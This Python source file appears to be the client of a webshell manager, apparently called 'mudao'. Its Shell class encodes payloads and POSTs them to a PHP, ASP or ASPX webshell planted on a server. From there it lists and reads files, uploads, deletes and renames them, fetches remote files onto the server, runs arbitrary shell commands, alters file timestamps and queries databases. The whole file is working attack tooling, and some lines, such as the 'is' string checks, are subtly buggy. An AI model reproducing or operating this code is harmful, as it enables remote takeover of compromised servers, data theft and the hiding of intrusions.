from mudao.utils.tool import CONF
from mudao.utils.tool import parse_ado
from mudao.utils.tool import parse_connstr
from mudao.utils.tool import request


class Shell(object):

    def __init__(self, url, pwd, type='php', encoder=None):
        self._url = url
        self._pwd = pwd
        self._type = type
        self._encoder = encoder
        self._base = self.getbase()
        self._flag = CONF.get('FLAG', 'M@M')
        self._k1 = CONF.get('K1', 'k1')
        self._k2 = CONF.get('K2', 'k2')
        self._k3 = CONF.get('K3', 'k3')

    def getbase(self):
        pl = CONF.get(self._type.upper() + '_BASE', '')
        if self._type.lower() == 'php':
            pl = pl % 'action'
        elif self._type.lower() == 'asp':
            pl = pl % (self._flag, 'action', self._flag)
        elif self._type.lower() == 'aspx':
            pl = pl % (self._flag, 65001, 'action', self._flag)

        return pl

    def generate(self, pl, code='utf-8'):
        pl = pl.encode(code)
        if self._type.lower() is 'asp':
            import binascii as ba
            ret = self._base.replace('action', ba.hexlify(pl).decode(code))
        else:
            import base64 as b64
            ret = self._base.replace('action', b64.b64encode(pl).decode(code))
        return ret

    def getinfo(self):
        pl = CONF.get('GETBASEINFO').get(self._type.upper())
        params = self.generate(pl)
        return self.POST(params)

    def showfolder(self, path):
        pl = CONF.get('SHOWFOLDER').get(self._type.upper()) % path
        params = self.generate(pl)
        return self.POST(params)

    def showtext(self, path):
        pl = CONF.get('SHOWTEXTFILE').get(self._type.upper()) % path
        params = self.generate(pl)
        return self.POST(params)

    def savefile(self, path, content):
        pl = CONF.get('SAVETXTFILE').get(self._type.upper()) % path
        pl = pl.replace('#K1#', self._k1)
        params = self.generate(pl) + '&' + self._k1 + '=' + content
        return self.POST(params)

    def deletefile(self, path):
        pl = CONF.get('DELETEFILE').get(self._type.upper()) % path
        params = self.generate(pl)
        return self.POST(params)

    def downfile(self, path):
        pl = CONF.get('DOWNFILE').get(self._type.upper()) % path
        params = self.generate(pl)
        return self.POST(params)

    def uploadfile(self, path, content):
        pl = CONF.get('UPLOADFILE').get(self._type.upper()) % path
        pl = pl.replace('#K1#', self._k1)
        pl = pl.replace('#K2#', self._k2) if '#K2#' in pl else pl
        params = self.generate(pl) + '&' + self._k1 + '=' + content
        if self._type.lower() is 'asp':
            params += '&' + self._k2 + '=' + len(content)
        return self.POST(params)

    def pastefile(self, src, dest):
        pl = CONF.get('PASTEFILE').get(self._type.upper()) % (src, dest)
        params = self.generate(pl)
        return self.POST(params)

    def newfolder(self, name):
        pl = CONF.get('NEWFOLDER').get(self._type.upper()) % name
        params = self.generate(pl)
        return self.POST(params)

    def wget(self, rpath, lpath):
        pl = CONF.get('WGET').get(self._type.upper()) % (rpath, lpath)
        params = self.generate(pl)
        return self.POST(params)

    def shell(self, cmd_path, cmd):
        pl = CONF.get('SHELL').get(self._type.upper()) % (cmd_path, cmd)
        params = self.generate(pl)
        return self.POST(params)

    def rename(self, src, dest):
        pl = CONF.get('RENAME').get(self._type.upper()) % (src, dest)
        params = self.generate(pl)
        return self.POST(params)

    def settime(self, time):
        pl = CONF.get('SETTIME').get(self._type.upper()) % time
        params = self.generate(pl)
        return self.POST(params)

    def database(self, connstr, cmd):
        if cmd not in ('DBLIST', 'TABLELIST', 'COLUMNLIST', 'EXECUTESQL'):
            return None
        if self._type.lower() == 'php':
            dbtype, hst, usr, pwd, dbn = parse_connstr(connstr)
            key = 'DB_PHP' + dbtype.upper()
            pl = CONF.get(key).get(cmd) % (hst, usr, pwd, dbn)
        elif self._type.lower() in ('asp', 'aspx'):
            conn = parse_ado(connstr)
            pl = CONF.get('DB_' + self._type.upper() + '_ADO').get(cmd) % conn
        params = self.generate(pl)
        return self.POST(params)

    def GET(self, params):
        url = self._url + '?' + self._pwd + '=' + params
        return request(url)

    def POST(self, params):
        data = self._pwd + '=' + params
        return request(self._url, data)


if __name__ == '__main__':
    s = Shell('http://localhost/test.php', 'a', 'php')
    print(s.getinfo())
    print(s.showfolder('.'))
